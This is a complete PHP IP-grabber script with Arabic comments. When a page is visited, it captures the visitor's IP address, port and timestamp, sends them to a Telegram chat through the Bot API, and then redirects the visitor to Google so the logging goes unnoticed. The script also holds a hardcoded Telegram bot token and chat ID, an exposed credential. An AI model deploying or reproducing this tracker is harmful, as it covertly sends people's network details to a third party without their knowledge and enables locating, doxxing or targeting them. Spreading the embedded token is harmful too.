<?php
// الحصول على عنوان IP
$ip = $_SERVER['REMOTE_ADDR'];

// الحصول على رقم المنفذ
$port = $_SERVER['REMOTE_PORT'];

// الحصول على التوقيت
$timestamp = date("Y-m-d H:i:s");

// توكن البوت ومعرف المحادثة
$botToken = "6834740418:AAF57BdoErZZ7Qr_9dYmUdFYIvEuf2H61tE";
$chatId = "6834740418";

// الرسالة التي سيتم إرسالها
$message = "عنوان IP الخاص بالزائر هو: " . $ip . "\n" .
           "رقم المنفذ الخاص بالزائر هو: " . $port . "\n" .
           "التوقيت الذي دخل فيه الزائر هو: " . $timestamp;

// إنشاء عنوان URL لطلب API
$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($message);

// إرسال الطلب إلى API
file_get_contents($url);

// إعادة توجيه الزائر إلى Google
header('Location: https://www.google.com');
exit();
?>
